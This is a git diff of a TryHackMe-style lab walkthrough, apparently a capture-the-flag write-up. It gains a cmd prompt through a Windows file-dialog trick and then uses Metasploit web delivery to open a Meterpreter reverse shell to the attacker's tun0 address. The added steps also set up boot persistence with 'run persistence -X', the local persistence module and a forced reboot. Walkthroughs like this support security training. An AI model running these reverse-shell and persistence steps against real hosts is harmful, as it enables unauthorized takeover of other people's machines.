@@ -139,7 +139,7 @@ Click the Settings Gear icon and select "File" and then "Save as", then a dialog
 
 <img width="511" height="233" alt="image" src="https://github.com/user-attachments/assets/1fe974f3-e7ff-4a77-93a9-5194b0169bda" />
 
-Then save the Filename as `c:\Windows\system32\*.*` and press Save so we can open this directly indirectly.
+Then save the Filename as `c:\Windows\system32\*.*` and press Save so we can open this directory indirectly.
 
 <img width="514" height="250" alt="image" src="https://github.com/user-attachments/assets/c7b86e57-4616-4d83-b56d-10259ac9f500" />
 
@@ -189,53 +189,71 @@ Metasploit can generate different types of payloads, so we will create a PowerSh
 
 3. After setting your payload, set your lhost and lport accordingly such that you know which port the MSF web server is going to run on and that it'll be running on the TryHackMe network.
 
-Check your tun0 IP address by command `ifconfig` then set your LHOST by `set LHOST TUN0_IP` and LPORT is already set to `4444`
+Check your tun0 IP address by command `ifconfig` then set your LHOST by `set LHOST TUN0_IP` and LPORT is already set to `4444` but you can verify by `set LPORT 4444`
 
-<img width="676" height="52" alt="image" src="https://github.com/user-attachments/assets/999ec14e-ad62-487c-8f72-3ba64981747a" />
+<img width="681" height="94" alt="image" src="https://github.com/user-attachments/assets/78591713-82fd-42eb-8b6b-303570236b15" />
 
 <img width="763" height="633" alt="image" src="https://github.com/user-attachments/assets/5234e007-575c-45d7-9ded-da345e40103d" />
 
 4. Finally, let's set our payload. In this case, we'll be using a simple reverse HTTP payload. Do this now with the command: 'set payload windows/meterpreter/reverse_http'. Following this, launch the attack as a job with the command 'run -j'.
 
+<img width="856" height="181" alt="image" src="https://github.com/user-attachments/assets/e3705727-80d3-4c11-b95c-6c8efacaeeec" />
 
+5. Return to the terminal we spawned with our exploit. In this terminal, paste the command output by Metasploit after the job was launched. In this case, I've found it particularly helpful to host a simple python web server (python3 -m http.server) and host the command in a text file as copy and paste between the machines won't always work. Once you've run this command, return to our attacker machine and note that our reverse shell has spawned.
 
+Paste the chunk from "powershell" to "==" to the cmd of Administrator we exploited so it will give us a reverse shell and a meterpreter session will open.
 
+<img width="1714" height="499" alt="image" src="https://github.com/user-attachments/assets/5919762d-7a7e-49e3-aea4-327741bba0cf" />
 
+Select the first session by `session -i 1`
 
+<img width="292" height="50" alt="image" src="https://github.com/user-attachments/assets/4b0c7608-fff5-4694-b76a-2c16392d6a80" />
 
+6. Last but certainly not least, let's look at persistence mechanisms via Metasploit. What command can we run in our meterpreter console to setup persistence which automatically starts when the system boots? Don't include anything beyond the base command and the option for boot startup.
 
+`run persistence -X`
 
+I checked this hint website [Meterpreter Service](https://www.offsec.com/metasploit-unleashed/meterpreter-service/) where I understood by command `run persistence -h` we can see options we can use with persistence so there was an option with `-X` flag where it automatically start the agent when the system boots so it answers the questions that which command we can use that automatically starts when the system boots.
 
+7. Run this command now with options that allow it to connect back to your host machine should the system reboot. Note, you'll need to create a listener via the handler exploit to allow for this remote connection in actual practice. Congrats, you've now gain full control over the remote host and have established persistence for further operations!
 
+I did not try this but here is the full workflow:
 
+Background the Meterpreter Session
 
+```
+meterpreter > background
+```
 
+Load the Persistence Module: `use exploit/windows/local/persistence`
 
+Configure the Module
 
+```
+show options
+set SESSION 1
+set LHOST <TUN0_IP>
+set LPORT 4444
+set STARTUP SYSTEM
+```
 
+Run the Exploit: `exploit`
 
+Load the Multi Handler `use exploit/multi/handler`
 
+Configure the Handler:
 
+```
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <TUN0_IP>
+set LPORT 4444
+```
 
+Start the Listener: `run`
 
+Reboot the Target: `reboot` or from Windowd CMD `shutdown /r /t 0`
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+Once the target restarts, the Meterpreter session should automatically reconnect to the handler.
 
 
 
